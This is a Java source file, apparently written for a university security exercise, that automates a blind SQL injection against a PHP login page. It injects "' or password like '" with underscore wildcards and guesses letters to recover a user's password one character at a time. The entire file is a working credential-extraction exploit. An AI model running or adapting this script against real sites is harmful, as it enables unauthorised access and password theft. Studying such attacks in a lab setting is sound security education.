import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;

public class PasswordFinder {
	
	private String username, password, underscore, url, pageText;
	private static String[] alphabet = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"};
	private int counter;
	private static String injection = "' or password like '";
	
	public PasswordFinder(String username){
		
		this.username = username;
		
		password = "";
		counter = 0; 
		url = "http://st223.dcs.kcl.ac.uk:8080/osc2/tin.php?username="+username+"&password=somepassword";
	
		for(int i = 0; i < 8; i++){
			wildCards();
			checker();	
		}		
	}
	
	public void checker(){
		
		boolean result = false;
		
		for(int j = 0; j < 26; j++){
			
			String testURL = url+injection+underscore+alphabet[j]+"%";

			try {
				connectTo(testURL);
			} catch (URISyntaxException e) {

				e.printStackTrace();
			}
		
		if(pageText.equals("Nope") || pageText.equals("-1") || pageText.equals("Nope-1")){
			result = false;
		} else { 
			result = true;
			addToPW(alphabet[j]);
			counter++;	
		}
		}
	}
	
	
	public void connectTo(String url) throws URISyntaxException{
		try {
		    URL target = new URL(url);
		    URI targeturi = new URI(target.getProtocol(), target.getUserInfo(), target.getHost(), target.getPort(), target.getPath(), target.getQuery(), target.getRef());
		    target = new URL(targeturi.toASCIIString());
		    URLConnection connection = target.openConnection();
		    connection.connect();
		    readPage(connection);
		    
		} catch (MalformedURLException e) { 
		} catch (IOException e) {}
		
		
	}
	
	public void readPage(URLConnection uc ) throws IOException{
		
		BufferedReader bf = new BufferedReader(new InputStreamReader(uc.getInputStream()));
		String text;
		 
		while ((text = bf.readLine()) != null) 
		pageText = text;
		bf.close();
	}
	
	
	public void addToPW(String addition){
		password = password+addition;
	}
	
	public void wildCards(){
		underscore = "";
		for(int k = 0; k < counter; k++){
			underscore = underscore+"_";
		}
	}
	
	public String getPassword(){
		return password;
	}

}
